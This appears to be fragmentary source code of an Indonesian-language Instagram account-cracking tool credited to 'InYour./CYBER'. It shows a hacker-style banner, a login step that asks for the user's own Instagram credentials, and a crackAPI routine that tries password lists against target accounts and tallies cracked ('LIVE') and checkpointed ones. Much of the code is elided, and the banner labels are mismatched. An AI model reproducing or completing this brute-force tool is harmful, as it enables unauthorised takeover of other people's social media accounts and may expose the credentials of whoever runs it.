...
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┣[ Auth      : InYour./CYBER                          ]┫
┣[ Instagram : https://instagram.com/mastah_illusion  ]┫
┣[ YOUTUBE   : https://youtube.com/channel/UCDHPmTQ5rQwj0an9vM-3UHA   ]┫
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
...
def login():
	global external
	try:
		print(f'\n{M}┣[!] Gunakan Username Dan Password Instagram Untuk Login. Sebelum Login )astikan Akun Bersifat Publik Bukan Privat\n')
		us=input(f"{CY}┣[•] Masukan Username: {C}")
...
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┣[ Auth      : InYour./CYBER                 ]┫
┣[ Instagram : 081902271822                  ]┫
┣[ Github    : https://instagram.com/mastah_illusion                    ]┫
┣[ YOUTUBE   : https://youtube.com/channel/UCDHPmTQ5rQwj0an9vM-3UHA     ]┫
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
...
┣[•] Anda Bisa Melaporkan Langsung Ke Instagram {H}mastah_illusion{C}{CY}
┣[•] InYour./CYBER ADMIN BAIK BANGET
		""")
		exit()
...
{C}		""")
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r{CY}┣[•_•][{K}{loop}/{len(internal)}{C}] {H}[LIVE :{len(success)}]{C}  {M}[FUCK :{len(checkpoint)}]{C} "),sys.stdout.flush()
		try:
			for pw in pas:
